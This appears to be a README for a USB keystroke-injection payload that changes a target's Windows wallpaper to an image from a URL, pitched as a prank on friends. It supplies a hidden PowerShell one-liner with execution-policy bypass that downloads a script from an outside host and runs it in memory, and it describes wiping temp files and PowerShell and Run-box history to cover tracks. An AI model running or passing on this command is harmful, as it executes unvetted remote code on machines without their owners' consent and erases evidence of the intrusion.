
<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#Description">Description</a></li>
    <li><a href="#getting-started">Getting Started</a></li>
    <li><a href="#Contributing">Contributing</a></li>
    <li><a href="#Version-History">Version History</a></li>
    <li><a href="#Contact">Contact</a></li>
    <li><a href="#Acknowledgments">Acknowledgments</a></li>
  </ol>
</details>

# Wallpaper-URL

This payload will download an image from any URL and set it as the target's wallpaper. 

## Description

Use this program to troll your friends. Find any image online and grab the URL and insert it into the PS1 script. 
Run this payload and step away. Once a mouse movement is detected, their wallpaper will change right in front of their eyes.
Lastly, to clean up your tracks behind you, the tmp folder will be emptied and the PowerShell and run box history will be wiped.


## Getting Started

### Dependencies

* Windows 10,11

<p align="right">(<a href="#top">back to top</a>)</p>

### Executing program

* Plug in your device
* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
* Place your images URL in the $url variable
```
powershell -w h -NoP -NonI -Exec Bypass $url='https://mblogthumb-phinf.pstatic.net/20160113_96/hamini91_1452688891338spXNO_JPEG/20160113_213226.png?type=w800';irm jakoby.lol/pkw | iex
```

<p align="right">(<a href="#top">back to top</a>)</p>
